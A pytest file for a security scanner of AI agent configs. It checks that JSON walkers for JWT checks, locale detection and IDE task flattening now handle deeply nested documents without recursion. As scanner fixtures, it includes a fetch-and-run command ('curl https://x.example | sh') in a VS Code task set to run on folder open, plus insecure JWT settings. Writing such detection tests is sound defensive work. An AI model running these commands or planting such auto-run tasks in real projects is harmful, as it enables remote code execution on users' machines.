"""The walkers over a parsed JSON document keep their own stack.

JSON's parser reads about 10,000 levels on Python 3.12 and later (3.14 bounds
it by the stack instead), but a Python function stops at 1,000 frames. Five
walkers over a parsed document still recursed, one frame per level:
a2a_protocol's two JWT checks, eu_ai_act_art15_locale's locale and
user-facing walks, and ide_task_rce's flattening of a task's command line. A
10 to 30 KB agent card, locale config or tasks.json nested 5,000 deep raised
RecursionError in them, and that took the whole scanner down, with its findings
on every other file. Each now walks with its own stack, in the order it
recursed, checked against the old code on generated documents. On 3.9 to 3.11
the parser stops first, at about 990 levels, so a file never reached them, and
now every version refuses a JSON file nested past 500 levels before it is
parsed (`JSON_MAX_NESTING`), so a file reaches them at most that deep; a
document built any other way still may be deeper.
"""

from __future__ import annotations

import json
import random
import re
import sys
from pathlib import Path
from typing import Any

import pytest

from agent_audit_kit.engine import run_scan
from agent_audit_kit.scanners import a2a_protocol, eu_ai_act_art15_locale, ide_task_rce
from agent_audit_kit.scanners._helpers import find_line_number, make_finding

# Just inside `JSON_MAX_NESTING`, which every version's parser reads.
DEEP = 450


def _write(root: Path, rel: str, text: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def _random_value(rng: random.Random, depth: int, keys: list[str], leaves: list[object]) -> object:
    roll = rng.random()
    if depth <= 0 or roll < 0.35:
        return rng.choice(leaves)
    if roll < 0.7:
        return {rng.choice(keys): _random_value(rng, depth - 1, keys, leaves) for _ in range(rng.randint(0, 4))}
    return [_random_value(rng, depth - 1, keys, leaves) for _ in range(rng.randint(0, 4))]


def _documents(seed: int, keys: list[str], leaves: list[object], count: int = 3_000) -> list[object]:
    rng = random.Random(seed)
    return [_random_value(rng, rng.randint(0, 7), keys, leaves) for _ in range(count)]


# ---------------------------------------------------------------------------
# The old walkers, as they were before they kept their own stack
# ---------------------------------------------------------------------------


def _old_jwt_lifetime(data: Any, rel_path: str, raw_text: str) -> list:
    findings: list = []

    def _inspect(obj: Any) -> None:
        if not isinstance(obj, dict):
            return
        for key in a2a_protocol._LIFETIME_KEYS:
            if key in obj:
                seconds = a2a_protocol._parse_lifetime_seconds(obj[key])
                if seconds is not None and seconds > 3600:
                    findings.append(make_finding(
                        "AAK-A2A-005", rel_path, f"JWT lifetime '{key}' is {seconds}s (>{3600}s)",
                        find_line_number(raw_text, key),
                    ))
        for v in obj.values():
            if isinstance(v, dict):
                _inspect(v)
            elif isinstance(v, list):
                for item in v:
                    _inspect(item)

    _inspect(data)
    return findings


def _old_jwt_validation(data: Any, rel_path: str, raw_text: str) -> list:
    findings: list = []

    def _inspect(obj: Any) -> None:
        if not isinstance(obj, dict):
            return
        for key in ("verifySignature", "verify_signature"):
            val = obj.get(key)
            if val is False or (isinstance(val, str) and val.lower() == "false"):
                findings.append(make_finding(
                    "AAK-A2A-006", rel_path, f"'{key}' is disabled", find_line_number(raw_text, key)))
        algorithms = obj.get("algorithms", [])
        if isinstance(algorithms, list):
            for alg in algorithms:
                if isinstance(alg, str) and alg.lower() == "none":
                    findings.append(make_finding(
                        "AAK-A2A-006", rel_path, "JWT algorithms include 'none'", find_line_number(raw_text, alg)))
        for v in obj.values():
            if isinstance(v, dict):
                _inspect(v)
            elif isinstance(v, list):
                for item in v:
                    _inspect(item)

    _inspect(data)
    return findings


def _old_declared_locales(data: Any) -> set[str]:
    found: set[str] = set()
    normalize = eu_ai_act_art15_locale._normalize_locale

    def _visit(node: Any) -> None:
        if isinstance(node, dict):
            for key, val in node.items():
                key_lower = str(key).lower()
                if key_lower in {"locales", "languages", "supported_languages", "supported", "locale_set",
                                 "language_set"}:
                    if isinstance(val, list):
                        for item in val:
                            loc = normalize(str(item))
                            if loc:
                                found.add(loc)
                    elif isinstance(val, str):
                        for part in re.split(r"[,\s]+", val):
                            loc = normalize(part)
                            if loc:
                                found.add(loc)
                elif key_lower in {"locale", "language", "default_locale", "primary_locale"}:
                    if isinstance(val, str):
                        loc = normalize(val)
                        if loc:
                            found.add(loc)
                _visit(val)
        elif isinstance(node, list):
            for item in node:
                _visit(item)

    _visit(data)
    return found


def _old_is_user_facing(data: Any, raw_text: str) -> bool:
    explicit = {"unset"}
    surface_re = eu_ai_act_art15_locale._USER_FACING_SURFACE_RE
    roles = eu_ai_act_art15_locale._USER_FACING_ROLES

    def _walk(node: Any) -> None:
        if isinstance(node, dict):
            for k, v in node.items():
                kl = str(k).lower()
                if kl in {"user_facing", "userfacing", "is_user_facing"}:
                    if v is True or (isinstance(v, str) and v.strip().lower() in {"true", "yes", "1"}):
                        explicit.add("yes")
                    elif v is False or (isinstance(v, str) and v.strip().lower() in {"false", "no", "0"}):
                        explicit.add("no")
                elif kl in {"surface", "audience", "channel"}:
                    if isinstance(v, str) and surface_re.search(v):
                        explicit.add("yes")
                elif kl in {"role", "type", "kind"}:
                    if isinstance(v, str) and v.strip().lower() in roles:
                        explicit.add("yes")
                _walk(v)
        elif isinstance(node, list):
            for item in node:
                _walk(item)

    _walk(data)
    if "yes" in explicit:
        return True
    if "no" in explicit:
        return False
    return bool(surface_re.search(raw_text))


def _old_flatten_strings(value: object) -> list[str]:
    out: list[str] = []
    if isinstance(value, str):
        out.append(value)
    elif isinstance(value, dict):
        for v in value.values():
            out.extend(_old_flatten_strings(v))
    elif isinstance(value, list):
        for v in value:
            out.extend(_old_flatten_strings(v))
    return out


# ---------------------------------------------------------------------------
# The same answers, in the same order
# ---------------------------------------------------------------------------

_JWT_KEYS = [*a2a_protocol._LIFETIME_KEYS, "verifySignature", "verify_signature", "algorithms", "auth", "x"]
_JWT_LEAVES: list[object] = [7200, 60, "2h", "7200", "x", "false", "False", False, True, None, ["none", "RS256"],
                             ["None"], 3600.5]


def _shown(findings: list) -> list[tuple[str, str, int | None]]:
    return [(f.rule_id, f.evidence, f.line_number) for f in findings]


def test_the_jwt_checks_report_what_they_did_on_every_shape() -> None:
    reported = 0
    for doc in _documents(1, _JWT_KEYS, _JWT_LEAVES):
        raw = json.dumps(doc, indent=1)
        for new, old in ((a2a_protocol._check_jwt_lifetime, _old_jwt_lifetime),
                         (a2a_protocol._check_jwt_validation, _old_jwt_validation)):
            got = _shown(new(doc, "agent-card.json", raw))
            assert got == _shown(old(doc, "agent-card.json", raw)), doc
            reported += len(got)
    assert reported > 300


_LOCALE_KEYS = ["locales", "languages", "supported", "Locale", "language", "default_locale", "user_facing",
                "userFacing", "surface", "audience", "role", "kind", "type", "x"]
_LOCALE_LEAVES: list[object] = ["en", "fr-FR", "de, es", "pt_BR ja", "public", "end-user", "assistant", "chatbot",
                                "internal", "true", "no", True, False, None, 7, ["en", "it"], ["xx", "fr"]]


def test_the_locale_walks_answer_as_they_did_on_every_shape() -> None:
    declared = facing = 0
    for doc in _documents(2, _LOCALE_KEYS, _LOCALE_LEAVES):
        raw = json.dumps(doc)
        locales = eu_ai_act_art15_locale._extract_declared_locales(doc)
        assert locales == _old_declared_locales(doc), doc
        answer = eu_ai_act_art15_locale._is_user_facing(doc, raw)
        assert answer == _old_is_user_facing(doc, raw), doc
        declared += len(locales) >= 2
        facing += answer
    assert declared > 150 and facing > 600


def test_a_task_command_line_flattens_as_it_did_on_every_shape() -> None:
    strings = 0
    for doc in _documents(3, ["windows", "linux", "value", "quoting", "x"], ["a", "b c", "", 7, None, True]):
        got = ide_task_rce._flatten_strings(doc)
        assert got == _old_flatten_strings(doc), doc
        strings += len(got)
    assert strings > 3_000


# ---------------------------------------------------------------------------
# Deeper than the recursion limit
# ---------------------------------------------------------------------------


def _nest(depth: int, leaf: object, key: str | None = None) -> object:
    value = leaf
    for _ in range(depth):
        value = {key: value} if key is not None else [value]
    return value


def test_each_walk_reads_a_document_deeper_than_the_recursion_limit() -> None:
    """Built in Python, so it runs on every version: the old walkers raised
    RecursionError on each of these."""
    depth = sys.getrecursionlimit() * 20
    card = _nest(depth, {"expiresIn": 7200, "verifySignature": False}, "a")
    raw = json.dumps({"expiresIn": 7200, "verifySignature": False})
    assert [f.evidence for f in a2a_protocol._check_jwt_lifetime(card, "c.json", raw)] == [
        "JWT lifetime 'expiresIn' is 7200s (>3600s)"]
    assert [f.evidence for f in a2a_protocol._check_jwt_validation(card, "c.json", raw)] == [
        "'verifySignature' is disabled"]
    config = _nest(depth, {"locales": ["en", "fr"], "user_facing": True}, "a")
    assert eu_ai_act_art15_locale._extract_declared_locales(config) == {"en", "fr"}
    assert eu_ai_act_art15_locale._extract_declared_locales(_nest(depth, {"locale": "de"})) == {"de"}
    assert eu_ai_act_art15_locale._is_user_facing(config, "") is True
    assert ide_task_rce._flatten_strings(_nest(depth, "curl x | sh")) == ["curl x | sh"]
    assert ide_task_rce._flatten_strings(_nest(depth, "sh", "linux")) == ["sh"]


def _deep_list() -> str:
    return "[" * DEEP + "1" + "]" * DEEP


def _deep_object() -> str:
    return '{"a":' * DEEP + "1" + "}" * DEEP


_DEEP_FILES = [
    # An agent card: a2a_protocol's JWT checks walked every object in it.
    ("agent-card.json", lambda: '{"name": "x", "url": "https://agent.example/a2a", "expiresIn": 7200, "x": '
     + _deep_object() + "}", "AAK-A2A-005"),
    (".well-known/agent.json", lambda: '{"name": "x", "url": "https://agent.example/a2a", "algorithms": ["none"], '
     '"x": ' + _deep_list() + "}", "AAK-A2A-006"),
    # A locale config: eu_ai_act_art15_locale's walks entered lists and objects alike.
    ("agent.json", lambda: '{"locales": ["en", "fr"], "user_facing": true, "x": ' + _deep_list() + "}", None),
    ("agents.json", lambda: '{"locales": ["en", "fr"], "x": ' + _deep_object() + "}", None),
    # A task's command line: ide_task_rce flattened it.
    (".vscode/tasks.json", lambda: '{"version": "2.0.0", "tasks": [{"label": "x", "type": "shell", "command": '
     '"curl https://x.example | sh", "args": ' + _deep_list() + ', "runOptions": {"runOn": "folderOpen"}}]}',
     "AAK-IDE-TASK-001"),
]


@pytest.mark.parametrize(("rel", "text", "rule_id"), _DEEP_FILES, ids=[rel for rel, _, _ in _DEEP_FILES])
def test_a_json_file_nested_to_the_limit_is_read_by_every_scanner(
    tmp_path: Path, rel: str, text: Any, rule_id: str | None
) -> None:
    _write(tmp_path, rel, text())
    result = run_scan(tmp_path, strict_loading=True)
    assert [f.evidence for f in result.scanner_failures] == []
    if rule_id is not None:
        assert rule_id in {f.rule_id for f in result.findings if f.file_path == rel}


@pytest.mark.parametrize("rel", [rel for rel, _, _ in _DEEP_FILES])
def test_a_json_file_nested_past_the_limit_is_refused_per_file_on_every_version(tmp_path: Path, rel: str) -> None:
    """5,000 levels, which 3.12 and later parse and which took the walkers past
    the recursion limit: refused before parsing now, by each scanner that reads
    it, and the scanner goes on."""
    _write(tmp_path, rel, '{"x": ' + "[" * 5_000 + "]" * 5_000 + "}")
    result = run_scan(tmp_path, strict_loading=True)
    assert {f.file_path for f in result.scanner_failures} == {rel}
    assert all("error=RefusedFile: " in f.evidence and "deeper than 500 levels" in f.evidence
               for f in result.scanner_failures)
